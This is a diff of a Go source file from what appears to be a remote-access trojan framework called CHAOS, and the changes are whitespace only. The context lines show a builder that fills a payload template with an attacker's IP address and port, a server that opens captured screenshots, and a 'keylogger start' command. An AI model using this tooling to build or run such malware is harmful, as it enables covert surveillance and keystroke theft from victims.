@@ -119,28 +119,28 @@ func Encrypt(Key []byte, PlainCode []byte) string {
 }
 
 func getDateTime() string{
-  currentTime := time.Now()
-  // https://golang.org/pkg/time/#example_Time_Format
-  return currentTime.Format("2006-01-02-15-04-05")
+	currentTime := time.Now()
+  	// https://golang.org/pkg/time/#example_Time_Format
+  	return currentTime.Format("2006-01-02-15-04-05")
 }
 
 func TemplateTextReplace(ParamOne string, ParamTwo string, ParamThree string, ParamFour string, ParamFive string){
-  input, err := ioutil.ReadFile("Template_CHAOS.go")
+	input, err := ioutil.ReadFile("Template_CHAOS.go")
 
-  if err != nil {
+	if err != nil {
     fmt.Println(RED, "[!] Error to replace template!")
 		os.Exit(1)
-  }
+  	}
 
-  output := bytes.Replace(input, []byte("IPAddress"), []byte(string(ParamOne)), -1)
-  output = bytes.Replace(output, []byte("ServerPort"), []byte(string(ParamTwo)), -1)
-  output = bytes.Replace(output, []byte("FileNameCHAOS"), []byte(string(ParamThree)), -1)
-  output = bytes.Replace(output, []byte("NameFolderExtesion"), []byte(string(ParamFour)), -1)
+  	output := bytes.Replace(input, []byte("IPAddress"), []byte(string(ParamOne)), -1)
+  	output = bytes.Replace(output, []byte("ServerPort"), []byte(string(ParamTwo)), -1)
+  	output = bytes.Replace(output, []byte("FileNameCHAOS"), []byte(string(ParamThree)), -1)
+  	output = bytes.Replace(output, []byte("NameFolderExtesion"), []byte(string(ParamFour)), -1)
 
-  if err = ioutil.WriteFile(ParamFive + ".go", output, 0666); err != nil {
-	fmt.Println(RED, "[!] Error to write template!")
-	os.Exit(1)
-  }
+	if err = ioutil.WriteFile(ParamFive + ".go", output, 0666); err != nil {
+		fmt.Println(RED, "[!] Error to write template!")
+		os.Exit(1)
+	}
 }
 
 func ServeFiles(){
@@ -367,8 +367,8 @@ func RunServer() {
 
 			out, err := exec.Command("sh", "-c", "eog " + string(outputName) + ".png").Output()
 			if err != nil {
-		     	 fmt.Printf("%s", err)
-		   	}
+		    	fmt.Printf("%s", err)
+			}
 			fmt.Printf("%s", out)
 
 		case "keylogger start":
